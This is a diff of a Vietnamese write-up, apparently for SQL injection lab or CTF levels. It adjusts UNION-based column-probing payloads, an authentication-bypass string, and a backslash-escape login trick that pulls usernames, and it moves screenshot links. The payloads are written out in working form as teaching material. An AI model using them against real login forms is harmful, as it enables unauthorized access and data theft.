@@ -437,12 +437,12 @@ SELECT * FROM logins WHERE (username='admin')
     - Chèn thử một câu truy vấn Union với số lượng cột khác nhau.
 
     ```sql
-    cn' UNION select 1,2,3-- -
+    cn' UNION select 1,2,3-- 
     ```
 
     - Nếu lệnh trên lỗi, thử với 4 cột:
     ```sql
-    cn' UNION select 1,2,3,4-- -
+    cn' UNION select 1,2,3,4-- 
     ```
 
     - Khi kết quả trả về thành công, nghĩa là bảng có 4 cột.
@@ -522,6 +522,9 @@ admin" or "1"="1 --
 admin") -- 
 ```
 
+![image](https://github.com/user-attachments/assets/be37814c-a5f0-4350-8080-82ca1af57c72)
+
+
 ### LV4
 - Chall check valid.
 ```php
@@ -548,11 +551,12 @@ function loginHandler($username, $password)
 ```
 - Có nghĩa là ta không được sử dụng `"`.
 
-![image](https://github.com/user-attachments/assets/be37814c-a5f0-4350-8080-82ca1af57c72)
 
 - Ta phải tìm cách thoát khỏi dấu `"`. Ở đây thì mình tìm được cách dùng `\` để thoát khỏi `"`, nhập:
     - Username: `\`
     - Password: `) UNION SELECT username from users-- `
+
+### LV5
 ![image](https://github.com/user-attachments/assets/defc8e9a-2f4c-4aa8-b333-30003824b5cf)
 
 ![image](https://github.com/user-attachments/assets/ed5863d6-0220-46cd-838c-602d2b6a1596)
